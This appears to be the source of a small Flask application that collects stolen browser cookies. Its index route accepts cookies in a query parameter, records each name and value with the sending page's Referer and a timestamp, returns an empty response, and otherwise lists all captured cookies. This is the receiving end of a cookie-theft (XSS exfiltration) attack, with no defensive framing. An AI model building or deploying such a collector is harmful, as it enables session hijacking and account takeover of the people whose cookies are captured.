from datetime import datetime
from flask import render_template, request
from ..models import Cookie, db
from . import main

@main.route('/')
def index():
    cookies = request.args.get('cookies')

    if not cookies:
        cs = Cookie.query.all()
        cs = sorted(cs, key=lambda c: c.date)
        return render_template('index.html', cookies=cs)

    cookies = [c.strip() for c in cookies.split(';')]
    for c in cookies:
        c = c.split('=')
        host = request.headers['Referer']
        now = datetime.now().isoformat()
        if not host:
            host = "nil"
        cookie = Cookie(name=c[0], value=c[1], host=host, date=now)
        db.session.add(cookie)
    db.session.commit()
    return ''
